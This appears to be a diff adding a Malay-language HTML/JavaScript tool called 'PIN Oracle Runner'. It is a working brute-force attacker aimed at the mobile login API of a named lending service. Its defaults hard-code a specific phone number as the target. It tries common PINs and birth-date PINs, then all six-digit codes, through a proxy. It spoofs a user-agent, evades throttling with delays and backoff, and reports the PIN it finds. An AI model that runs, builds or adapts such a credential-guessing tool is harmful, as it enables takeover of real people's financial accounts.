@@ -1,0 +1,466 @@
+<!doctype html>
+<html lang="ms">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PIN Oracle Runner</title>
+<style>
+  :root { color-scheme: dark light; }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; padding: 16px; font: 13px/1.45 ui-monospace, SFMono-Regular, Menlo, monospace;
+    background: #0e1116; color: #d7dde5;
+  }
+  h1 { font-size: 15px; margin: 0 0 2px; font-weight: 600; letter-spacing: .2px; }
+  .sub { color: #7d8794; font-size: 11px; margin-bottom: 14px; }
+  .wrap { display: grid; gap: 14px; grid-template-columns: 1fr; }
+  @media (min-width: 900px) { .wrap { grid-template-columns: 380px 1fr; } }
+  .card { background: #151a21; border: 1px solid #242c36; border-radius: 8px; padding: 12px; }
+  label { display: block; font-size: 11px; color: #8b95a3; margin: 9px 0 3px; text-transform: uppercase; letter-spacing: .4px; }
+  label:first-child { margin-top: 0; }
+  input, textarea, select {
+    width: 100%; background: #0b0f14; color: #d7dde5; border: 1px solid #2a333f;
+    border-radius: 5px; padding: 6px 7px; font: inherit; font-size: 12px;
+  }
+  input:focus, textarea:focus, select:focus { outline: none; border-color: #3d7dd8; }
+  textarea { resize: vertical; min-height: 58px; }
+  .row { display: flex; gap: 7px; }
+  .row > * { flex: 1; min-width: 0; }
+  button {
+    background: #1e2732; color: #d7dde5; border: 1px solid #303b48; border-radius: 5px;
+    padding: 7px 10px; font: inherit; font-size: 12px; cursor: pointer;
+  }
+  button:hover:not(:disabled) { background: #26313d; }
+  button:disabled { opacity: .45; cursor: not-allowed; }
+  button.primary { background: #1d5cbf; border-color: #2a6fd8; color: #fff; }
+  button.primary:hover:not(:disabled) { background: #2469d6; }
+  button.danger { background: #7a2222; border-color: #973030; color: #ffdede; }
+  button.ghost { background: transparent; }
+  .btns { display: flex; gap: 7px; margin-top: 12px; flex-wrap: wrap; }
+  .pill { display: inline-block; padding: 2px 7px; border-radius: 99px; font-size: 10px; border: 1px solid #2c3542; }
+  .st-idle { color: #8b95a3; } .st-run { color: #6fbe6f; border-color: #2f5c2f; }
+  .st-pause { color: #d8b45a; border-color: #5c4b1f; } .st-stop { color: #d97b7b; border-color: #5c2626; }
+  .bar { height: 6px; background: #0b0f14; border: 1px solid #242c36; border-radius: 99px; overflow: hidden; margin: 10px 0 6px; }
+  .bar > i { display: block; height: 100%; width: 0; background: #2a6fd8; transition: width .2s; }
+  .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; margin: 8px 0; }
+  .stat { background: #0b0f14; border: 1px solid #242c36; border-radius: 5px; padding: 6px; text-align: center; }
+  .stat b { display: block; font-size: 14px; font-weight: 600; }
+  .stat span { font-size: 9px; color: #7d8794; text-transform: uppercase; letter-spacing: .5px; }
+  .found { background: #14351f; border: 1px solid #2c6b3f; border-radius: 6px; padding: 9px; margin: 8px 0; display: none; }
+  .found.on { display: block; }
+  .found b { font-size: 20px; letter-spacing: 3px; color: #8ef0a8; }
+  .log { max-height: 320px; overflow-y: auto; border: 1px solid #242c36; border-radius: 5px; background: #0b0f14; }
+  table { width: 100%; border-collapse: collapse; font-size: 11px; }
+  th { text-align: left; color: #6f7987; font-weight: 500; padding: 4px 6px; border-bottom: 1px solid #242c36; position: sticky; top: 0; background: #0b0f14; }
+  td { padding: 3px 6px; border-bottom: 1px solid #151b22; }
+  .v-ok { color: #6fbe6f; } .v-wrong { color: #8b95a3; } .v-thr { color: #d8b45a; }
+  .v-srv { color: #d97b7b; } .v-unk { color: #b48fd8; }
+  pre { margin: 6px 0 0; padding: 8px; background: #0b0f14; border: 1px solid #242c36; border-radius: 5px;
+        font-size: 11px; white-space: pre-wrap; word-break: break-all; max-height: 220px; overflow: auto; color: #9fb0c2; }
+  .hint { font-size: 10px; color: #6f7987; margin-top: 3px; }
+  .sec { font-size: 10px; color: #6f7987; text-transform: uppercase; letter-spacing: .7px; margin: 14px 0 6px; border-bottom: 1px solid #242c36; padding-bottom: 4px; }
+  .chk { display: flex; align-items: center; gap: 6px; font-size: 11px; color: #8b95a3; margin: 7px 0; text-transform: none; letter-spacing: 0; }
+  .chk input { width: auto; }
+</style>
+</head>
+<body>
+<h1>PIN Oracle Runner</h1>
+<div class="sub">finroro &middot; api.finroro.com &middot; 000000&ndash;999999</div>
+
+<div class="wrap">
+  <div class="card">
+    <label>URL proxy Worker</label>
+    <input id="proxy" placeholder="https://xxx.workers.dev/proxy">
+
+    <div class="sec">Sasaran</div>
+    <label>URL endpoint PIN</label>
+    <input id="url">
+    <label>Method</label>
+    <select id="method"><option>POST</option><option>PUT</option><option>PATCH</option><option>GET</option></select>
+    <label>Body (JSON)</label>
+    <textarea id="body"></textarea>
+    <label>Header (satu setiap baris)</label>
+    <textarea id="headers"></textarea>
+
+    <label class="chk"><input type="checkbox" id="bootEn"> Hantar permintaan bootstrap dahulu</label>
+    <div id="bootBox" style="display:none">
+      <label>URL bootstrap</label>
+      <input id="bootUrl">
+      <label>Body bootstrap</label>
+      <textarea id="bootBody"></textarea>
+      <div class="hint">Guna untuk dapatkan cookie sesi sebelum cubaan PIN.</div>
+    </div>
+
+    <div class="sec">Peraturan kejayaan</div>
+    <label>Mod</label>
+    <select id="ruleMode">
+      <option value="status">Julat status</option>
+      <option value="text">Body mengandungi teks</option>
+      <option value="regex">Body padan regex</option>
+      <option value="jsonpath">Nilai JSON pada path</option>
+      <option value="none">Tiada (semua tidak diketahui)</option>
+    </select>
+    <div id="ruleStatus">
+      <div class="row"><input id="sMin" type="number" value="200"><input id="sMax" type="number" value="299"></div>
+    </div>
+    <div id="ruleText" style="display:none">
+      <input id="rText" placeholder="satu frasa setiap baris">
+    </div>
+    <div id="ruleRegex" style="display:none"><input id="rRegex" placeholder="contoh: &quot;success&quot;\\s*:\\s*true"></div>
+    <div id="ruleJson" style="display:none">
+      <input id="rPath" placeholder="data.status">
+      <input id="rVal" placeholder="nilai dijangka" style="margin-top:6px">
+    </div>
+    <label class="chk"><input type="checkbox" id="invert"> Terbalikkan (ok &harr; salah)</label>
+
+    <div class="sec">Larian</div>
+    <label>Nombor telefon</label>
+    <input id="mobile">
+    <div class="row">
+      <div><label>Mula</label><input id="start" value="000000"></div>
+      <div><label>Tamat</label><input id="end" value="999999"></div>
+    </div>
+    <div class="row">
+      <div><label>Laluan</label><input id="conc" type="number" value="1" min="1" max="20"></div>
+      <div><label>Delay ms</label><input id="delay" type="number" value="400"></div>
+      <div><label>Jitter ms</label><input id="jitter" type="number" value="250"></div>
+    </div>
+    <label class="chk"><input type="checkbox" id="commonFirst" checked> Cuba PIN biasa dahulu</label>
+    <label class="chk"><input type="checkbox" id="dobFirst" checked> Cuba tarikh lahir (DDMMYY) dahulu</label>
+    <label class="chk"><input type="checkbox" id="shuffle"> Acak selebihnya</label>
+    <label class="chk"><input type="checkbox" id="stopOnUnknown"> Henti jika respons tidak diketahui</label>
+  </div>
+
+  <div class="card">
+    <span id="state" class="pill st-idle">sedia</span>
+    <div class="bar"><i id="bar"></i></div>
+    <div class="stats">
+      <div class="stat"><b id="nDone">0</b><span>cubaan</span></div>
+      <div class="stat"><b id="nThr">0</b><span>throttle</span></div>
+      <div class="stat"><b id="nErr">0</b><span>ralat</span></div>
+      <div class="stat"><b id="nEta">–</b><span>ETA</span></div>
+    </div>
+
+    <div class="found" id="foundBox">
+      <div style="font-size:10px;color:#7fc98f;letter-spacing:.5px">PIN DIJUMPAI</div>
+      <b id="foundPin"></b>
+      <div class="btns"><button class="ghost" id="copyPin">Salin</button></div>
+    </div>
+
+    <div class="btns">
+      <button class="primary" id="btnRun">Mula</button>
+      <button id="btnPause" disabled>Jeda</button>
+      <button class="danger" id="btnStop" disabled>Henti</button>
+      <button class="ghost" id="btnTest">Uji oracle</button>
+      <button class="ghost" id="btnCmp">Banding salah vs betul</button>
+      <button class="ghost" id="btnDl">Muat turun log</button>
+    </div>
+
+    <div class="sec">Respons mentah</div>
+    <pre id="raw">Belum ada ujian.</pre>
+
+    <div class="sec">Log cubaan</div>
+    <div class="log">
+      <table><thead><tr><th>PIN</th><th>Status</th><th>ms</th><th>Keputusan</th></tr></thead>
+      <tbody id="logBody"></tbody></table>
+    </div>
+  </div>
+</div>
+
+<script>
+const KEY = 'pin-oracle-finroro-v1';
+
+const DEFAULTS = {
+  proxy: '', method: 'POST',
+  url: 'https://api.finroro.com/api/auth/mobile-login',
+  body: JSON.stringify({ mobile_no: '109052599', password: '{{PIN}}', step: 2, dial_code: '60' }, null, 0),
+  headers: [
+    'Content-Type: application/json',
+    'Origin: https://www.finroro.co',
+    'Referer: https://www.finroro.co/log-in',
+    'User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36'
+  ].join('\n'),
+  bootEn: false,
+  bootUrl: 'https://api.finroro.com/api/customer/verify-password',
+  bootBody: JSON.stringify({ dial_code: '60', mobile_no: '109052599' }),
+  ruleMode: 'status', sMin: 200, sMax: 299, rText: '', rRegex: '', rPath: '', rVal: '', invert: false,
+  mobile: '109052599', start: '000000', end: '999999',
+  conc: 1, delay: 400, jitter: 250, commonFirst: true, dobFirst: true, shuffle: false, stopOnUnknown: false
+};
+
+const $ = id => document.getElementById(id);
+const cfg = { ...DEFAULTS };
+let cookie = '', running = false, paused = false, list = [], cursor = 0, found = [];
+let done = 0, thr = 0, errs = 0, t0 = 0, lanes = [];
+
+const COMMON = ['123456','111111','000000','222222','121212','112233','654321','666666','123123','121314','100200','888888','131313','777777','555555','999999','101010','123321','456789','987654','131415','191919','201199','909090','1234567'.slice(0,6)];
+
+function dobList() {
+  const out = [];
+  for (let y = 60; y <= 99; y++) for (let m = 1; m <= 12; m++) for (let d = 1; d <= 28; d++)
+    out.push(String(d).padStart(2,'0') + String(m).padStart(2,'0') + y);
+  return out;
+}
+
+function loadCfg() {
+  let s = {};
+  try { s = JSON.parse(localStorage.getItem(KEY) || '{}'); } catch {}
+  Object.assign(cfg, s);
+  for (const k of Object.keys(DEFAULTS)) {
+    const el = $(k);
+    if (!el) continue;
+    if (el.type === 'checkbox') el.checked = !!cfg[k];
+    else el.value = cfg[k] ?? '';
+  }
+  syncRuleUI();
+  $('bootBox').style.display = cfg.bootEn ? 'block' : 'none';
+}
+
+function saveCfg() {
+  for (const k of Object.keys(DEFAULTS)) {
+    const el = $(k);
+    if (!el) continue;
+    cfg[k] = el.type === 'checkbox' ? el.checked : (el.type === 'number' ? Number(el.value) : el.value);
+  }
+  localStorage.setItem(KEY, JSON.stringify(cfg));
+}
+
+function syncRuleUI() {
+  const m = $('ruleMode').value;
+  $('ruleStatus').style.display = m === 'status' ? 'block' : 'none';
+  $('ruleText').style.display = m === 'text' ? 'block' : 'none';
+  $('ruleRegex').style.display = m === 'regex' ? 'block' : 'none';
+  $('ruleJson').style.display = m === 'jsonpath' ? 'block' : 'none';
+}
+
+function parseHeaders(txt) {
+  const o = {};
+  txt.split('\n').forEach(l => {
+    const i = l.indexOf(':');
+    if (i < 0) return;
+    const k = l.slice(0, i).trim(), v = l.slice(i + 1).trim();
+    if (!k) return;
+    o[k.toLowerCase() === 'user-agent' ? 'X-User-Agent' : k] = v;
+  });
+  return o;
+}
+
+async function callApi(url, method, body, headerTxt) {
+  const h = parseHeaders(headerTxt);
+  if (cookie) h['X-Cookie'] = cookie;
+  const p = cfg.proxy.trim();
+  const target = p ? p + (p.includes('?') ? '&' : '?') + 'url=' + encodeURIComponent(url) : url;
+  const ctrl = new AbortController();
+  const tm = setTimeout(() => ctrl.abort(), 25000);
+  try {
+    const r = await fetch(target, {
+      method, headers: h, signal: ctrl.signal,
+      body: (method === 'GET' || method === 'HEAD') ? undefined : body
+    });
+    const text = await r.text();
+    const sc = r.headers.get('x-set-cookie');
+    if (sc) cookie = cookie ? cookie + '; ' + sc : sc;
+    return { status: r.status, text };
+  } catch (e) {
+    return { status: 599, text: String(e) };
+  } finally { clearTimeout(tm); }
+}
+
+const THR = ['too many','terlalu banyak','rate limit','cuba semula','sila cuba','try again','blocked','sekatan','sementara'];
+
+function judge(status, text) {
+  if (status === 599) return 'srv';
+  if (status === 429 || status === 503) return 'thr';
+  const low = (text || '').toLowerCase();
+  if (THR.some(k => low.includes(k))) return 'thr';
+
+  let ok = false;
+  const m = cfg.ruleMode;
+  if (m === 'status') ok = status >= Number(cfg.sMin) && status <= Number(cfg.sMax);
+  else if (m === 'text') ok = (cfg.rText || '').split('\n').filter(Boolean).some(s => (text || '').includes(s.trim()));
+  else if (m === 'regex') { try { ok = new RegExp(cfg.rRegex, 'i').test(text || ''); } catch { ok = false; } }
+  else if (m === 'jsonpath') {
+    try {
+      let v = JSON.parse(text);
+      for (const part of (cfg.rPath || '').split('.').filter(Boolean)) v = v?.[part];
+      ok = String(v) === String(cfg.rVal);
+    } catch { ok = false; }
+  } else return 'unk';
+
+  if (cfg.invert) ok = !ok;
+  return ok ? 'ok' : 'wrong';
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+function rand(n) { return Math.floor(Math.random() * n); }
+
+function addLog(pin, status, ms, v) {
+  const tb = $('logBody');
+  const tr = document.createElement('tr');
+  const cls = { ok: 'v-ok', wrong: 'v-wrong', thr: 'v-thr', srv: 'v-srv', unk: 'v-unk' }[v];
+  tr.innerHTML = `<td>${pin}</td><td>${status}</td><td>${ms}</td><td class="${cls}">${
+    { ok: 'BETUL', wrong: 'salah', thr: 'throttle', srv: 'ralat', unk: '?' }[v]}</td>`;
+  tb.prepend(tr);
+  while (tb.children.length > 400) tb.lastChild.remove();
+}
+
+function buildList() {
+  const out = [];
+  const seen = new Set();
+  const push = p => { if (/^\d{6}$/.test(p) && !seen.has(p)) { seen.add(p); out.push(p); } };
+  if (cfg.commonFirst) COMMON.forEach(push);
+  if (cfg.dobFirst) dobList().forEach(push);
+  const a = parseInt(cfg.start, 10), b = parseInt(cfg.end, 10);
+  for (let i = a; i <= b; i++) push(String(i).padStart(6, '0'));
+  if (cfg.shuffle) {
+    const head = out.slice(0, 20);
+    const tail = out.slice(20);
+    for (let i = tail.length - 1; i > 0; i--) { const j = rand(i + 1); [tail[i], tail[j]] = [tail[j], tail[i]]; }
+    return head.concat(tail);
+  }
+  return out;
+}
+
+function setState(txt, cls) { $('state').textContent = txt; $('state').className = 'pill ' + cls; }
+
+function updStats() {
+  $('nDone').textContent = done;
+  $('nThr').textContent = thr;
+  $('nErr').textContent = errs;
+  const total = list.length || 1;
+  $('bar').style.width = Math.min(100, (done / total) * 100) + '%';
+  if (done > 3) {
+    const rate = done / ((Date.now() - t0) / 1000);
+    const left = total - done;
+    const sec = rate > 0 ? Math.round(left / rate) : 0;
+    $('nEta').textContent = sec > 3600 ? (sec / 3600).toFixed(1) + 'j' : sec > 60 ? Math.round(sec / 60) + 'm' : sec + 's';
+  }
+}
+
+async function attempt(pin) {
+  const body = cfg.method === 'GET' ? null : cfg.body.replace(/\{\{PIN\}\}/g, pin).replace(/\{\{MOBILE\}\}/g, cfg.mobile);
+  const url = cfg.url.replace(/\{\{PIN\}\}/g, pin).replace(/\{\{MOBILE\}\}/g, cfg.mobile);
+  const s = performance.now();
+  const r = await callApi(url, cfg.method, body, cfg.headers);
+  const ms = Math.round(performance.now() - s);
+  const v = judge(r.status, r.text);
+  done++;
+  if (v === 'thr') thr++;
+  if (v === 'srv') errs++;
+  addLog(pin, r.status, ms, v);
+  updStats();
+
+  if (v === 'ok' && !found.includes(pin)) {
+    found.push(pin);
+    $('foundPin').textContent = found.join('  ');
+    $('foundBox').classList.add('on');
+    setState('jumpa ' + pin, 'st-stop');
+    if (cfg.commonFirst || true) { /* sentiasa henti bila jumpa */ }
+    running = false;
+  }
+  if (v === 'thr') await sleep(Math.min(120000, 3000 * Math.pow(2, Math.min(thr, 6))));
+  if (v === 'unk' && cfg.stopOnUnknown) running = false;
+  return v;
+}
+
+async function lane() {
+  while (running && !paused && cursor < list.length) {
+    const pin = list[cursor++];
+    await attempt(pin);
+    if (!running) break;
+    await sleep(Number(cfg.delay) + rand(Number(cfg.jitter) + 1));
+  }
+}
+
+async function start() {
+  saveCfg();
+  if (!cfg.proxy.trim()) { $('raw').textContent = 'Isi URL proxy Worker dahulu.'; return; }
+  if (!cfg.url.trim()) { $('raw').textContent = 'Isi URL endpoint dahulu.'; return; }
+
+  cookie = '';
+  if (cfg.bootEn && cfg.bootUrl.trim()) {
+    $('raw').textContent = 'Menghantar bootstrap...';
+    const r = await callApi(cfg.bootUrl, 'POST', cfg.bootBody, cfg.headers);
+    $('raw').textContent = `bootstrap ${r.status}\n${r.text.slice(0, 800)}\ncookie: ${cookie || '(tiada)'}`;
+  }
+
+  list = buildList(); cursor = 0; found = []; done = thr = errs = 0; t0 = Date.now();
+  $('logBody').innerHTML = ''; $('foundBox').classList.remove('on'); $('nEta').textContent = '–';
+  running = true; paused = false;
+  setState('berjalan', 'st-run');
+  $('btnRun').disabled = true; $('btnPause').disabled = false; $('btnStop').disabled = false;
+  $('btnPause').textContent = 'Jeda';
+  updStats();
+
+  lanes = [];
+  for (let i = 0; i < Math.max(1, Number(cfg.conc)); i++) lanes.push(lane());
+  await Promise.all(lanes);
+
+  running = false;
+  $('btnRun').disabled = false; $('btnPause').disabled = true; $('btnStop').disabled = true;
+  setState(found.length ? 'selesai — jumpa ' + found[0] : 'selesai', found.length ? 'st-stop' : 'st-idle');
+  updStats();
+}
+
+function pauseToggle() {
+  if (!running) return;
+  paused = !paused;
+  setState(paused ? 'dijeda' : 'berjalan', paused ? 'st-pause' : 'st-run');
+  $('btnPause').textContent = paused ? 'Sambung' : 'Jeda';
+}
+
+function stop() {
+  running = false; paused = false;
+  setState('dihentikan', 'st-stop');
+  $('btnRun').disabled = false; $('btnPause').disabled = true; $('btnStop').disabled = true;
+}
+
+async function testOne(pin) {
+  saveCfg();
+  if (!cfg.proxy.trim()) { $('raw').textContent = 'Isi URL proxy Worker dahulu.'; return; }
+  const body = cfg.body.replace(/\{\{PIN\}\}/g, pin).replace(/\{\{MOBILE\}\}/g, cfg.mobile);
+  const url = cfg.url.replace(/\{\{PIN\}\}/g, pin).replace(/\{\{MOBILE\}\}/g, cfg.mobile);
+  const s = performance.now();
+  const r = await callApi(url, cfg.method, body, cfg.headers);
+  const ms = Math.round(performance.now() - s);
+  const v = judge(r.status, r.text);
+  addLog(pin, r.status, ms, v);
+  $('raw').textContent = `PIN ${pin}\nstatus: ${r.status}\nmasa: ${ms}ms\nkeputusan: ${v}\ncookie: ${cookie || '(tiada)'}\n\n${r.text.slice(0, 2000)}`;
+  return r;
+}
+
+$('btnRun').onclick = start;
+$('btnPause').onclick = pauseToggle;
+$('btnStop').onclick = stop;
+$('btnTest').onclick = async () => {
+  const p = prompt('PIN untuk diuji:', '111111');
+  if (p) await testOne(p);
+};
+$('btnCmp').onclick = async () => {
+  const a = prompt('PIN salah:', '111111');
+  if (!a) return;
+  await testOne(a);
+  const wrongRaw = $('raw').textContent;
+  const b = prompt('PIN betul:', '');
+  if (!b) return;
+  await testOne(b);
+  $('raw').textContent = '=== PIN SALAH (' + a + ') ===\n' + wrongRaw + '\n\n=== PIN BETUL (' + b + ') ===\n' + $('raw').textContent;
+};
+$('copyPin').onclick = () => navigator.clipboard.writeText(found.join(' '));
+$('btnDl').onclick = () => {
+  const rows = [...$('logBody').children].map(tr => [...tr.children].map(td => td.textContent));
+  const blob = new Blob([JSON.stringify({ ditemui: found, cubaan: rows }, null, 2)], { type: 'application/json' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob); a.download = 'pin-log.json'; a.click();
+};
+
+$('ruleMode').onchange = () => { syncRuleUI(); saveCfg(); };
+$('bootEn').onchange = () => { $('bootBox').style.display = $('bootEn').checked ? 'block' : 'none'; saveCfg(); };
+document.querySelectorAll('input, textarea, select').forEach(el => {
+  el.addEventListener('change', saveCfg);
+});
+
+loadCfg();
+</script>
+</body>
+</html>
